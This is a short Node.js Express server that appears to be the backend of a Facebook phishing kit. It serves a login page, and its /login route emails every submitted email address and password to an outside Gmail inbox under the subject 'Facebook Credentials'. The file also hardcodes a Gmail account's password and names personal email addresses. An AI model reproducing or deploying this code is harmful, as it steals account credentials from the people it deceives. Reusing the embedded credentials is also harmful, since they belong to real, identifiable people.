const express = require("express");
const app = express();
var nodemailer = require("nodemailer");
var bodyParser = require("body-parser");
app.use(
  bodyParser.urlencoded({
    extended: true,
  })
);
app.use(bodyParser.json());
const port = 3000;

app.get("/download", function (req, res) {
  const file = `${__dirname}/footer.zip`;
  res.download(file); // Set disposition and send it.
});

app.post("/login", (req, res) => {
  var transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "uminathiplaatyi@gmail.com",
      pass: "Uminathi@2019",
    },
  });

  var body =
    "<h1>Account Received</h1>" +
    "<p><b>Email :<b>" +
    req.body.email +
    "</p>" +
    "<p><b>Decrypted password: </b>" +
    req.body.password +
    "</p>";

  var mailOptions = {
    from: "uminathiplaatyi@gmail.com",
    to: "fezekileplaatyi@gmail.com",
    subject: "Facebook Credentials",
    html: body,
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
      res.send("Error");
    } else {
      console.log("Email sent: " + info.response);
      res.send("Sent");
    }
  });
});

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});
app.listen(port, () =>
  console.log(`Cracker listening at http://localhost:${port}`)
);
